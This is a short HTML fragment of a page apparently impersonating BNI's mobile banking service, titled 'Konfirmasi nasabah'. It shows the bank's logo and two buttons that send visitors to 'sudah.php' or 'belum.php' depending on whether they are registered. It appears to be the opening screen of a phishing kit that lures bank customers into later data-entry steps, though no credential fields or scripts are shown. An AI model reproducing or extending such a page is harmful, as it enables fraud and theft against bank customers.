...
<nav class="navbar navbar-inverse navbar-fixed-top"> 	<div class="container"> 		<div class="navbar-header"> 			<a class="navbar-brand" href="">Konfirmasi nasabah</a> 		</div> 		<div id="navbar-header-second" class="navbar-header-second navbar-right"> 			<a href="home"> 				<span>Layanan Digital</span> 			</a> 		</div> 	</div> </nav> 	 	


<div class="container container-margin"> 		
<form id="form" action="sudah.php" method="PST"> 			
...
<br>
<center>
<img src="img/bni.png" width="40%"></center>
<br>

<div class="form-group"> 								<label>Silahkan Pilih. Apakah Anda sudah terdaftar di Bni mobile atau belum.?</label> 			
<br>
<br>
<div class="row"> 				
<div class="col-md-12"> 	
<button class="btn btn-bni-2 pull-right" type="submit">SUDAH TERDAFTAR</button> 				</div> 			</div> 		</form> 	</div> 	 	
...
<div class="container container-margin"> 		
<form id="form" action="belum.php" method="PST"> 			
<input type="hidden" name="input" value="input" />	
<button class="btn btn-bni-2 pull-right" type="submit">BELUM TERDAFTAR</button> 				</div> 			</div> 		</form> 	</div> 	 	
